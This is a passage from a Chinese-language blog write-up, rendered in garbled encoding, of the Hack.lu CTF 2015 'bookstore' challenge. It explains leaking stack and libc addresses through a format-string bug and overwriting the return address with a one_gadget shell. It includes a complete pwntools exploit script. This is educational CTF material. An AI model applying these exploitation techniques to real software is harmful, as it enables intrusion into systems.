<p>è¿”å›åœ°å€åœ¨æ ˆä¸Šçš„ä½ç½®æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªä¸è¿”å›åœ°å€æœ‰å›ºå®šåç§»çš„æ ˆåœ°å€ã€‚æˆ‘ä»¬ä»æ ˆä¸Šå»æ‰¾ä¸€æ‰¾ï¼Œæˆ‘å‘ç°äº†è¿™ä¹ˆä¸€ä¸ªåœ°å€ï¼š</p>
<p><img src="/hack.lu ctf 2015 bookstore/å±å¹•å¿«ç…§ 2018-09-11 ä¸‹åˆ7.29.52.png" alt="å±å¹•å¿«ç…§ 2018-09-11 ä¸‹åˆ7.29.52"></p>
<p>è¿™ä¸ªæ ˆåœ°å€å§‹ç»ˆæŒ‡å‘æ¯”è‡ªå·±ä½<code>0x10</code>å­—èŠ‚çš„æ ˆåœ°å€ï¼Œè€Œä¸”æŒ‡å‘çš„æ ˆåœ°å€å’Œè¿”å›åœ°å€ä¹Ÿæœ‰å›ºå®šçš„<code>0x28</code>çš„åç§»ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„æ¼è¿™ä¸ªæ ˆåœ°å€ï¼Œä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€é˜¶æ®µåˆ©ç”¨åé‡æ–°æ‰§è¡Œmainå‡½æ•°åï¼Œæ ˆä¸Šçš„åœ°å€ä¼šäº§ç”Ÿä¸€ä¸ªå›ºå®šçš„åç§»ã€‚</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢æ‰€æåˆ°çš„<code>payload</code>ä¸­<code>&#39;,%28$p&#39;</code>çš„ç›®çš„å°±æ˜¯æ³„æ¼è¿™ä¸ªæ ˆåœ°å€ã€‚</p>
<p>æˆ‘ä»¬ç›´æ¥æŠŠ<code>gdb attach</code>ä¸Šå»è®¡ç®—å›ºå®šçš„åç§»ï¼š</p>
<p><img src="/hack.lu ctf 2015 bookstore/å±å¹•å¿«ç…§ 2018-09-11 ä¸‹åˆ8.20.56.png" alt="å±å¹•å¿«ç…§ 2018-09-11 ä¸‹åˆ8.20.56"></p>
<p>æ³„æ¼å¾—åˆ°çš„ç¬¬ä¸€é˜¶æ®µçš„è¿”å›åœ°å€ï¼š<code>0x7ffd88f7d6f8</code></p>
<p><img src="/hack.lu ctf 2015 bookstore/å±å¹•å¿«ç…§ 2018-09-11 ä¸‹åˆ8.21.19.png" alt="å±å¹•å¿«ç…§ 2018-09-11 ä¸‹åˆ8.21.19"></p>
<p><code>gdb</code>ä¸­å¾—åˆ°çš„ç¬¬äºŒé˜¶æ®µçš„è¿”å›åœ°å€ï¼š<code>0x7ffd88f7d4e8</code></p>
<p>æ‰€ä»¥å›ºå®šåç§»ä¸ºï¼š<code>0x7ffd88f7d6f8 - 0x7ffd88f7d4e8 = 0x210</code></p>
<p>æˆ‘ä»¬å¾—åˆ°äº†ç¬¬äºŒé˜¶æ®µçš„è¿”å›åœ°å€çš„æ ˆåœ°å€ä¹‹åå°±å¥½åŠäº‹äº†ï¼Œé‡å¤ç¬¬ä¸€é˜¶æ®µçš„æ„é€ åˆ©ç”¨å³å¯ï¼Œè¿™é‡Œé¢ä¸ºäº†æ–¹ä¾¿ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨<code>one_gadget</code>å·¥å…·ä¸­çš„<code>execve</code>å‡½æ•°åœ°å€æ¥è¦†ç›–è¿”å›åœ°å€ã€‚è¿™é‡Œç»è¿‡è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œ<code>execve</code>çš„åœ°å€å’Œè¿”å›åœ°å€åªæœ‰æœ€åä¸‰ä¸ªå­—èŠ‚ä¸åŒï¼Œæ‰€ä»¥æ„é€ æ ¼å¼åŒ–æ¼æ´çš„æ—¶å€™åªéœ€è¦è¦†ç›–è¿”å›åœ°å€æœ€åçš„ä¸‰ä½å³å¯ã€‚</p>
<p>å¯èƒ½æœºå­ç¯å¢ƒä¸ä¸€æ ·è¿™ä¸ªå›ºå®šåç§»ä¹Ÿä¸ä¸€æ ·ï¼Œæˆ‘çš„ç¯å¢ƒæ˜¯ï¼š</p>
<blockquote>
<p>Ubuntu16.04ï¼Œglibc2.23</p>
</blockquote>
<h3 id="ç»“æœ-ï¼š"><a href="#ç»“æœ-ï¼š" class="headerlink" title="ç»“æœ ï¼š"></a>ç»“æœ ï¼š</h3><p><img src="/hack.lu ctf 2015 bookstore/å±å¹•å¿«ç…§ 2018-09-11 ä¸‹åˆ9.16.26.png" alt="å±å¹•å¿«ç…§ 2018-09-11 ä¸‹åˆ9.16.26"></p>
<h2 id="EXP-ï¼š"><a href="#EXP-ï¼š" class="headerlink" title="EXP ï¼š"></a>EXP ï¼š</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./books&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">elf = ELF(&apos;./books&apos;)</span><br><span class="line">libc = ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line">def edit1(content) :</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;Enter first order:\n&apos;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def edit2(content) :</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;Enter second order:\n&apos;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete1() :</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line"></span><br><span class="line">def delete2() :</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line"></span><br><span class="line">def submit() :</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(&apos;5&apos;)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[&apos;free&apos;]</span><br><span class="line">fini_array = 0x6011B8</span><br><span class="line">main_addr = 0x400A39</span><br><span class="line"></span><br><span class="line">delete2()</span><br><span class="line"></span><br><span class="line">payload = &quot;%&quot;+str(2617)+&quot;c%13$hn&quot;  + &apos;.%31$p&apos; + &apos;,%28$p&apos;</span><br><span class="line">payload += &apos;A&apos;*(0x74-len(payload))</span><br><span class="line">payload += p8(0x0)*(0x88-len(payload))</span><br><span class="line">payload += p64(0x151)</span><br><span class="line">edit1(payload)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;5&apos;+p8(0x0)*7 + p64(fini_array)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">#leak --&gt; libc_base</span><br><span class="line">p.recvuntil(&apos;\x2e&apos;)</span><br><span class="line">p.recvuntil(&apos;\x2e&apos;)</span><br><span class="line">p.recvuntil(&apos;\x2e&apos;)</span><br><span class="line">data = p.recv(14)</span><br><span class="line">p.recvuntil(&apos;,&apos;)</span><br><span class="line">ret_addr = p.recv(14)</span><br><span class="line">data = int(data,16) - 240</span><br><span class="line">ret_addr = int(ret_addr,16) + 0x28 - 0x210</span><br><span class="line">libc_base = data - libc.symbols[&apos;__libc_start_main&apos;]</span><br><span class="line">log.success(&apos;ret_addr :&apos;+hex(ret_addr))</span><br><span class="line"></span><br><span class="line">#repeat --&gt; change ret_addr --&gt; system_addr(one_gadget)</span><br><span class="line">one_shot = libc_base + 0x45216</span><br><span class="line">print hex(one_shot)</span><br><span class="line">one_shot1 = &apos;0x&apos;+str(hex(one_shot))[-2:]</span><br><span class="line">one_shot2 = &apos;0x&apos;+str(hex(one_shot))[-6:-2]</span><br><span class="line">print one_shot1,one_shot2</span><br><span class="line">one_shot1 = int(one_shot1,16)</span><br><span class="line">one_shot2 = int(one_shot2,16)</span><br><span class="line"></span><br><span class="line">delete2()</span><br><span class="line"></span><br><span class="line">payload3 = &quot;%&quot; + str(one_shot1) + &quot;d%13$hhn&quot;</span><br><span class="line">payload3 += &apos;%&apos; + str(one_shot2-one_shot1) + &apos;d%14$hn&apos;</span><br><span class="line">payload3 += &apos;A&apos;*(0x74-len(payload3))</span><br><span class="line">payload3 += p8(0x0)*(0x88-len(payload3))</span><br><span class="line">payload3 += p64(0x151)</span><br><span class="line">edit1(payload3)</span><br><span class="line"></span><br><span class="line">payload4 = &apos;5&apos; + p8(0x0)*7 + p64(ret_addr) + p64(ret_addr+1)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ç›¸å…³é“¾æ¥ï¼š"><a href="#ç›¸å…³é“¾æ¥ï¼š" class="headerlink" title="ç›¸å…³é“¾æ¥ï¼š"></a>ç›¸å…³é“¾æ¥ï¼š</h3><p><a href="http://tukan.farm/2016/02/25/hacklu-2015-bookstore-writeup/" target="_blank" rel="noopener">Hack.lu 2015 bookstore writeup</a></p>

    
  </div>

  
      <div class="git"></div>
  

</article>


   

   
  <div class="box-prev-next clearfix">
    <a class="show pull-left" href="/2018/06/26/Return_to_dl_resolve/">
        <i class="icon icon-angle-left"></i>
    </a>
    <a class="show pull-right" href="/2018/09/13/House Of Einherjar/">
        <i class="icon icon-angle-right"></i>
    </a>
  </div>




</div>


  <a id="backTop" class="back-top">
    <i class="icon-angle-up"></i>
  </a>




  <div class="modal" id="modal">
  <span id="cover" class="cover hide"></span>
  <div id="modal-dialog" class="modal-dialog hide-dialog">
    <div class="modal-header">
      <span id="close" class="btn-close">å…³é—­</span>
    </div>
    <hr>
    <div class="modal-body">
      <ul class="list-toolbox">
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/archives/"
              rel="noopener noreferrer"
              target="_self"
              >
              åšå®¢
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/tag/"
              rel="noopener noreferrer"
              target="_self"
              >
              æ ‡ç­¾
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/link/"
              rel="noopener noreferrer"
              target="_self"
              >
              å‹é“¾
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/about/"
              rel="noopener noreferrer"
              target="_self"
              >
              å…³äº
            </a>
          </li>
        
      </ul>

    </div>
  </div>
</div>



  
      <div class="fexo-comments comments-post">
    

    
    

    
    

    

    
    

  </div>

  

  <script type="text/javascript">
  function loadScript(url, callback) {
    var script = document.createElement('script')
    script.type = 'text/javascript';

    if (script.readyState) { //IE
      script.onreadystatechange = function() {
        if (script.readyState == 'loaded' ||
          script.readyState == 'complete') {
          script.onreadystatechange = null;
          callback();
        }
      };
    } else { //Others
      script.onload = function() {
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
  }

  window.onload = function() {
    loadScript('/js/bundle.js?235683', function() {
      // load success
    });
  }
</script>

</body>
</html>
